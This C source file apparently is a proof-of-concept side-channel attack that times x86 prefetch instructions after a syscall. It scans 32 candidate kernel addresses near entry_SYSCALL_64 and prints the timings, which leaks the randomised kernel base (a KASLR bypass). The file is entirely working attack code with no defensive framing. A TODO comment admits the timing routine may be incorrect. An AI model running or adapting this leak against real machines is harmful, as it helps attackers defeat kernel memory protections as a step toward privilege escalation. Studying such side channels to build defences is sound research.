//
// Created by shixinsong on 10/2/23.
//
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/syscall.h>

#define START_KERNEL 0xffffffff80000000
#define ALIGN 0x2000000
#define NUM_OFFSETS 32

uint64_t sidechannel(uint64_t addr) {
    uint64_t a, b, c, d;
    asm volatile (".intel_syntax noprefix;"
                  "mfence;"
                  "rdtscp;"
                  "mov %0, rax;"
                  "mov %1, rdx;"
                  "xor rax, rax;"
                  "lfence;"
                  "prefetch qword ptr [%4];"
                  "xor rax, rax;"
                  "lfence;"
                  "rdtscp;"
                  "mov %2, rax;"
                  "mov %3, rdx;"
                  "mfence;"
                  ".att_syntax;"
            : "=r" (a), "=r" (b), "=r" (c), "=r" (d)
            : "r" (addr)
            : "rax", "rbx", "rcx", "rdx");
    // TODO: Check whether a is overwritten by the second rdtscp!!!
    a = (b << 32) | a;
    c = (d << 32) | c;
    return c - a;
}



int main() {
    // 1. offset = start_rodata or entry_syscall_64
    uint64_t start_rodata = 0xa00000;
    uint64_t entry_syscall_64 = 0x600010;
    uint64_t gadget_relative_dist = entry_syscall_64;
    // 2. leak_syscall_entry
    uint64_t scan_start = START_KERNEL + gadget_relative_dist;
    uint64_t data[NUM_OFFSETS] = {0};

    for (uint64_t idx = 0; idx < NUM_OFFSETS; idx++) {
        uint64_t text = scan_start + idx * ALIGN;
        syscall(104);
        uint64_t time = sidechannel(text);
        data[idx] += time;
    }

    for (uint64_t i = 0; i < NUM_OFFSETS; i++) {
        printf("%lx %ld\n", scan_start + i * ALIGN, data[i]);
    }
}
